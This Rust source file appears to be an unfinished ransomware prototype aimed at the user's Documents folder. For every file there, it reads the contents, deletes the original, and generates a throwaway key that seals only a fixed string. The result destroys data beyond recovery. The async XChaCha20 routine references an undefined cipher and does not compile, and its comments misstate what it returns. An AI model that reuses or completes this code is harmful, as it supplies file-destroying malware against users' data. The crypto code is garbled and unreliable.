use dirs::home_dir;
use orion::aead::streaming::{StreamSealer, StreamTag};
use std::fs;
use std::path::PathBuf;
use std::io::prelude::*;
use anyhow::Result;
use orion::aead;
use orion::errors::UnknownCryptoError;
use futures::{Stream, StreamExt};
use std::fs::File;
use std::io::{Read, Write};

const ENCRYPTED_EXTENSION:	&str	= ".🔒";
const CHUNK_SIZE:			usize	= 128;

fn main() -> Result<()> {
	let target_dir = format!(
		"{}\\Documents",
		home_dir().unwrap_or("~".into()).to_string_lossy()
	);
	println!("{}", target_dir);

	let entries = fs::read_dir(target_dir)?;
	for entry in entries {
		let path = entry?.path();

		if path.is_file() {
			encrypt_file(path)?;
		}
	}

	Ok(())
}

// Encrypts a file with XChaCha20 and returns the path to the encrypted file.
async fn encrypt_file_xchacha20<P>(
	input_file: P,
	output_file: P,
	key: &[u8]
) -> Result<()>
	where P: Into<PathBuf> + Send + Sync + Clone + 'static {
    // Open input and output files.
    let input_file = input_file.into();
    let mut input = File::open(&input_file)?;
    let output_file = output_file.into();
    let mut output = File::create(&output_file)?;

    // Read the input file in chunks and encrypt each chunk in turn.
    let mut input_stream = futures::io::AllowStdIo::new(input).into_async_read();
    let mut output_stream = futures::io::AllowStdIo::new(output).into_async_write();
    let mut buf = vec![0u8; 64 * 1024]; // Use a buffer of 64KB.
    while let Some(n) = input_stream.next().await {
        let mut chunk = n?;
        cipher.encrypt_in_place(&[], &mut chunk)?; // Encrypt the chunk.
        output_stream.write_all(&chunk).await?; // Write the encrypted chunk to the output file.
    }

    // Return the path to the encrypted file.
    Ok(())
}

fn encrypt_file(path: PathBuf) -> Result<()> {
	let file_name = path.file_name().unwrap().to_string_lossy();

	if !file_name.ends_with(ENCRYPTED_EXTENSION) {
		let mut file = fs::File::open(&path)?;
	
		let mut contents = Vec::new();
		file.read_to_end(&mut contents)?;

		let encrypted_path = PathBuf::from(
			format!("{}{}", path.display(), ENCRYPTED_EXTENSION)
		);

		fs::remove_file(&path)?;

		let secret_key = aead::SecretKey::generate(256)?;
		let ciphertext = aead::seal(&secret_key, b"Secret message")?;
		//let decrypted_data = aead::open(&secret_key, &ciphertext)?;
	}

	Ok(())
}

fn generate_key() -> aead::SecretKey {
	aead::SecretKey::generate(256).unwrap()
}
